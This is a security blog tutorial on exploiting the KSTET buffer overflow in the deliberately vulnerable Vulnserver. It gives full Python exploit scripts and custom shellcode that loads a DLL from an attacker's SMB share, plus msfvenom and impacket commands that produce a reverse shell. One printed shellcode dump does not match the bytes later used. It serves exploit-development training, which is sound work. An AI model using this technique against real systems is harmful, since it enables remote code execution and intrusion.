---
slug: vulnserver-kstet-alternative/
title: 'KSTET: DLL Side-Loading Exploit'
date: 2020-07-02
category: attacks
subtitle: Sideloading exploiting
tags: osce, vulnserver, training, exploit
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620331199/blog/vulnserver-kstet-alternative/cover_rpkuwo.webp
alt: Photo by Philipp Katzenberger on Unsplash
description: This post will show how to exploit the Vulnserver KSTET command
  loading the payload from an external source.
keywords: Business, Information, Security, Protection, Hacking, Exploit,
  OSCE, Ethical Hacking, Pentesting
author: Andres Roldan
writer: aroldan
name: Andres Roldan
about1: Cybersecurity Specialist, OSCP, CHFI
about2: '"We don''t need the key, we''ll break in" RATM'
source: https://unsplash.com/photos/iIJrUoeRoCQ
---

This is an alternate take of the article of exploiting the
[KSTET](../vulnserver-kstet/) command of `Vulnserver`, a VbD
(Vulnerable-by-Design) application in which you can practice Windows
exploit development.

The `KSTET` exploitation is really interesting because after controlling
the instruction pointer `EIP`, we are left with little space to work on.

With that kind of restrictions, we must be very creative in order to
achieve a working exploit that triggers something complex like a reverse
shell. For example, we also had space restrictions in the exploitation
of the `GTER` command, and we used an [Egghunter](../vulnserver-gter/)
and [reused part of the WinSock stack](../vulnserver-gter-no-egghunter/)
to create a custom reverse shellcode.

In the `KSTET` command article, we used a technique called [socket
reusing](../vulnserver-kstet/). In this post we will squeeze our space
restriction a little more and use a different exploitation technique.

I will shamelessly leave part of the article for the `KSTET`
exploitation and only divert it when needed.

`KSTET` take 2\!

## Fingerprinting KSTET

Enumerating and fingerprinting is the most important step when verifying
the security of any target.

Let’s check how the `KSTET` command behaves:

``` console
$ telnet 192.168.0.20 9999
Trying 192.168.0.20...
Connected to 192.168.0.20.
Escape character is '^]'.
Welcome to Vulnerable Server! Enter HELP for help.
KSTET hello
KSTET SUCCESSFUL
```

Well, easy enough. Now we are going to do the same but we will check it
under our debugger. I will use Immunity Debugger.

The first step is to identify where the `KSTET` command is processed.

We can do that by right-clicking, then `Search for → All referenced text
strings`, right-click again, then `Search for text` and type `KSTET`.
Make sure that `Entire scope` is selected. Now, select the match on
where `KSTET` string is presented and set a breakpoint:

<div class="imgblock">

![Debugging
KSTET](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331198/blog/vulnserver-kstet-alternative/debug1_kkqjhs.gif)

</div>

With that in place, we can start our connection to `Vulnserver` again
and see what happens under the hood:

<div class="imgblock">

![Debugging
KSTET](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331199/blog/vulnserver-kstet-alternative/debug2_wohqpl.gif)

</div>

As you can see, several things are happening:

1. Our breakpoint was reached when we typed `KSTET hello`.

2. Several external functions are called, including `strncpy`, `malloc`
    and `memset`.

3. There is one function that stands out: `strcpy`, which will copy
    anything that is on one buffer to another, without checking buffer
    boundaries.

Let’s see what happens when we issue something larger than a `hello` to
the `KSTET` command:

<div class="imgblock">

![Crash](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331199/blog/vulnserver-kstet-alternative/crash1_hdzpl8.gif)

</div>

Uggh\! With a very short string, Vulnserver crashed, and we overwrote
`EIP`, which means that we can control the execution flow of the
application.

With that, we can start creating our proof-of-concept exploit:

``` python
import socket

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'KSTET ' +
    b'A' * 200
)

with socket.create_connection((HOST, PORT)) as fd:
    print('Sending payload...')
    fd.sendall(PAYLOAD)
    print('Done.')
```

And check it:

<div class="imgblock">

![Crash](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331197/blog/vulnserver-kstet-alternative/poc1_ouzwf2.gif)

</div>

That’s good news. However, the injected string was really short, and
maybe we’d have a narrow buffer space to work on.

## Checking available buffer space

If we check the state of the application after the crash, we will see
this:

<div class="imgblock">

![Buffer
space](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331199/blog/vulnserver-kstet-alternative/space1_f2mosl.webp)

</div>

In the dump window (bottom left), we see our injected buffer. In the
PoC, we sent 200 `A` chars, but as you can see here, the total amount of
injected bytes, including the word `KSTET` itself, is only 0x63 or 99
bytes.

In the `GTER` command exploitation, we had 140+ bytes to work on, and we
used two techniques: [WinSocket stack
reusing](../vulnserver-gter-no-egghunter/) and an
[egghunter](../vulnserver-gter/).

The first one is not viable because although we reduced the shellcode
length to the half, the resultant shellcode was 128 bytes.

We could use an `egghunter` here, but that wouldn’t be much fun. Why
make it easy if we can do it the hard way?

OK, let’s start by checking the offset of the crash by creating a cyclic
pattern of 100 characters using `pattern_create.rb` tool from
Metasploit:

``` console
$ msf-pattern_create -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

And update our exploit:

``` python
import socket

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'KSTET ' +
    b'<paste pattern here>'
)

with socket.create_connection((HOST, PORT)) as fd:
    print('Sending payload...')
    fd.sendall(PAYLOAD)
    print('Done.')
```

And check it:

<div class="imgblock">

![Cyclic
pattern](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331197/blog/vulnserver-kstet-alternative/offset1_srjfjl.gif)

</div>

As you can see, `EIP` was overwritten with `63413363`. We can check the
offset of that bytes on our cyclic pattern to get the offset on where
`EIP` gets overwritten:

``` console
$ msf-pattern_offset -q 63413363
[*] Exact match at offset 70
```

Now, check that offset by updating our exploit:

``` python
import socket

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'KSTET ' +
    b'A' * 70 +
    b'B' * 4 +
    b'C' * 26
)

with socket.create_connection((HOST, PORT)) as fd:
    print('Sending payload...')
    fd.sendall(PAYLOAD)
    print('Done.')
```

And run it:

<div class="imgblock">

![Cyclic
pattern](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331196/blog/vulnserver-kstet-alternative/offset2_rbtocx.gif)

</div>

Wonderful\! We know exactly how to overwrite `EIP` to get control over
the execution flow.

## Exploiting

As with the [TRUN](../vulnserver-trun/) and [GTER](../vulnserver-gter/)
commands, we have a direct `EIP` overwrite here, and the `ESP` register
points directly to our controlled buffer. That means that we can look
for a `JMP ESP` instruction and overwrite `EIP` with its address to take
control of the execution flow. We can do that using `mona.py` plugin:

``` console
!mona jmp -r esp -cp nonull -o
```

This would tell `mona` to look for instructions that can be used to jump
to `ESP` (`jmp -r esp`), excluding pointers with null bytes (`-cp
nonull`) and omitting OS DLLs (`-o`). The result is the following:

<div class="imgblock">

![JMP
ESP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331197/blog/vulnserver-kstet-alternative/mona1_ym7y00.webp)

</div>

We can choose any of those 9 pointers. I’ll choose the one at
`625011BB`.

Now, we can update the exploit with that address:

``` python
import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'KSTET ' +
    b'A' * 70 +
    # 625011BB    FFE4                        JMP ESP
    struct.pack('<L', 0x625011BB) +
    b'C' * 26
)

with socket.create_connection((HOST, PORT)) as fd:
    print('Sending payload...')
    fd.sendall(PAYLOAD)
    print('Done.')
```

And check it:

<div class="imgblock">

![JMP
ESP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331198/blog/vulnserver-kstet-alternative/jmp1_rcg7tb.gif)

</div>

Great\! However, as you can see, we landed on a 20 bytes buffer where we
put the `C` chars, but we have 66 bytes above on the buffer of the `A`
chars.

With a short jump backward, we can easily jump to that place:

<div class="imgblock">

![JMP
backwards](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331196/blog/vulnserver-kstet-alternative/jmp2_mgivno.gif)

</div>

The resultant bytes were `EB B5`. We can update our exploit with that:

``` python
import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'KSTET ' +
    b'A' * 70 +
    # 625011BB    FFE4                        JMP ESP
    struct.pack('<L', 0x625011BB) +
    # JMP SHORT 0xb5
    b'\xeb\xb5' +
    b'C' * (26 - 2)
)

with socket.create_connection((HOST, PORT)) as fd:
    print('Sending payload...')
    fd.sendall(PAYLOAD)
    print('Done.')
```

And check it:

<div class="imgblock">

![JMP
backwards](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331196/blog/vulnserver-kstet-alternative/jmp3_abef43.gif)

</div>

But again, we were brutally reminded that we have a narrow buffer space
to work on.

To work around that constraint, we will use this time a sideloading
technique for injecting the needed payload from an adjacent computer.

## Dynamic linking

Commonly, when creating an exploit, you inject the required payload and
modify the instruction pointer `EIP` to point to your code. Then, the
victim application will execute the code you injected, which can be a
simple `MessageBox` or anything complex like a `TCP` shell.

That payload, or shellcode, can only use calls to the OS API of modules
that the victim application has already loaded in memory.

The OS API is distributed on reusable files that can be linked to any
application. In Windows, they are known as **Dynamic-Link Library** or
`DLL` files. Commonly, an application will load executable dependencies
at run-time using the OS dynamic linker.

We can see the `DLL` files loaded using several ways. On Vulnserver, we
will use our debugger again:

<div class="imgblock">

![Executable
modules](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331198/blog/vulnserver-kstet-alternative/modules1_mmzwqz.webp)

</div>

That means that Vulnserver (and therefore, our shellcode) can execute
any function included on any of those modules.

However, there is a way for an application to include new libraries when
it’s already running: **Dynamic Linking**. On Windows, it can be done
with any of the **LibraryLoad** functions family. Those functions are
located on `KERNEL32.DLL`, which is the module that exposes most of the
Win32 base API; therefore, virtually any Windows application has it
loaded at run-time.

As the injected shellcode is also part of the application, we can
dynamically link any available `DLL`.

With that ultra-simplified introduction to dynamic linking, it’s time to
write some Assembler\!

## Dynamic-included payload

The first thing to do is to locate the address of `LoadLibraryA` on our
system. We can do that using the
[arwin](http://www.vividmachines.com/shellcode/arwin.c) tool:

``` console
C:\Users\Fluid Attacks\Downloads\osce\tools>arwin.exe kernel32 LoadLibraryA
arwin - win32 address resolution program - by steve hanna - v.01
LoadLibraryA is located at 0x76460b30 in kernel32
```

**NOTE:** I’m using `Windows 10 Pro 20H2` at the moment of this writing.
As `ASLR` is enabled by default, the `LoadLibraryA` address will change
on every reboot.

We also need to know the `LoadLibraryA` parameters:

**Taken from
<https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya>.**

``` cpp
HMODULE LoadLibraryA(
  LPCSTR lpLibFileName
);
```

Easy\! The `lpLibFileName` is a string with the location of the `DLL`
file to be included. To our advantage, the location can be a Universal
Naming Convention (`UNC`) path in the form `\\server\share\file.dll`.

In Windows, that path would be resolved using the `SMB` protocol. That
means that we must expose that file using an `SMB` server, but we will
get to that later. For now, we can predict that the `UNC` path of our
payload will be at `\\attacker_ip\share\shell.dll`; in my case, it would
be `\\192.168.0.18\X\pwn.dll`.

To call `LoadLibraryA` on an `x86` architecture, we must push into the
stack the `lpLibFileName` value, which is a pointer to the
`\\192.168.0.18\X\pwn.dll` string. As `x86` is a 32 bits architecture,
we must push exactly 4 bytes each time into the stack, and as we are
pushing data into the stack, it must be in reverse order. So, we need to
convert `\\192.168.0.18\X\pwn.dll` to hex, split it in chunks of 4
bytes, pad as needed and reverse. This can be done with:

``` console
$ for i in $(echo -ne '\\\\192.168.0.18\\X\\pwn.dll' | xxd -ps | tr -d '\n' | fold -w 8); do python3 -c "import struct;print(struct.pack('<L', 0x$i).hex())"; done | tac | sed 's/^/push 0x/g'
push 0x6c6c642e
push 0x6e77705c
push 0x585c3831
push 0x2e302e38
push 0x36312e32
push 0x39315c5c
```

With the required information, we can now write the call to
`LoadLibraryA`:

``` x86asm
sub esp,0x64            ; Move ESP pointer above our initial buffer to avoid
                        ; overwriting our shellcode
xor ebx,ebx             ; Zero out EBX that will be the NULL byte terminating
                        ; the UNC path
push ebx                ; PUSH NULL byte
push 0x6c6c642e         ; \\192.168.0.18\X\pwn.dll reversed
push 0x6e77705c
push 0x585c3831
push 0x2e302e38
push 0x36312e32
push 0x39315c5c
push esp                ; Push pointer of the UNC path
mov ebx,0x76460b30      ; Move into EBX the address of 'LoadLibraryA'
call ebx                ; call 'LoadLibraryA("\\192.168.0.18\X\pwn.dll")'
```

We can compile that using `nasm`:

``` console
nasm -f elf32 -o shellcode.o shellcode.asm
```

And obtain the shellcode using this:

``` bash
$ for i in $(objdump -d shellcode.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
\x83\xec\x64\x31\xdb\x53\x68\x2e\x64\x6c\x6c\x68\x6c\x6c\x30\x30\x68\x5c
\x73\x68\x65\x68\x31\x38\x5c\x73\x68\x38\x2e\x30\x2e\x68\x32\x2e\x31\x36
\x68\x5c\x5c\x31\x39\xbb\x30\x0b\x46\x76\xff\xd3
```

Let’s update our exploit with that:

``` python
import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

LOAD_LIBRARY = (
    b'\x83\xec\x64\x31\xdb\x53\x68\x2e\x64\x6c\x6c\x68\x5c\x70\x77\x6e'
    b'\x68\x31\x38\x5c\x58\x68\x38\x2e\x30\x2e\x68\x32\x2e\x31\x36\x68'
    b'\x5c\x5c\x31\x39\x54\xbb\x30\x0b\x46\x76\xff\xd3'
)

PAYLOAD = (
    b'KSTET ' +
    b'\x90' * 2 +
    LOAD_LIBRARY +
    b'A' * (70 - len(LOAD_LIBRARY) - 2) +
    # 625011BB    FFE4                        JMP ESP
    struct.pack('<L', 0x625011BB) +
    # JMP SHORT 0xb5
    b'\xeb\xb5' +
    b'C' * (26 - 2)
)

with socket.create_connection((HOST, PORT)) as fd:
    print('Sending payload...')
    fd.sendall(PAYLOAD)
    print('Done.')
```

And check it:

<div class="imgblock">

![LoadLibrary](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331197/blog/vulnserver-kstet-alternative/loadlib1_neogoa.gif)

</div>

Great\! The `LoadLibraryA` function is now ready.

## Show time

Now that we have everything set, we must now create a shellcode on a
`DLL` file and share it on an `SMB` server.

Luckily for us, `msfvenom` can create shellcodes in `DLL` format. Let’s
do that:

``` console
$ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.0.18 LPORT=4444 EXITFUNC=none -f dll -o pwn.dll
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 5120 bytes
Saved as: pwn.dll
```

We also must serve that `pwn.dll` file on an `SMB` share called `X`. We
can use Impacket’s `smbserver.py` to do that:

``` console
$ sudo impacket-smbserver -smb2support X .
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

This will create a new anonymous `SMB` server, will share the current
directory `.`, using a share called `X`. The `-smb2support` parameter is
needed because Windows 10 will refuse to connect to `SMB` servers using
the `SMBv1` protocol.

We are now ready. We can check our exploit:

<div class="imgblock">

![Success](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331196/blog/vulnserver-kstet-alternative/success_mbwkf4.gif)

</div>

Yes\! We got a shell\! You can see how the victim is self-hacking by
retrieving the payload from our attacking machine\!

You can also see that `pwn.dll` is now part of the `vulnserver.exe`
executable modules:

<div class="imgblock">

![Executable
modules](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331196/blog/vulnserver-kstet-alternative/modules2_bdsaow.webp)

</div>

Crazy, huh? You can download the final exploit [here](exploit.py).

## Conclusion

This was a very fun way of exploiting Vulnserver. Remember that this
technique only works if the attacking machine is adjacent to the victim
machine and there are no network restrictions between them.
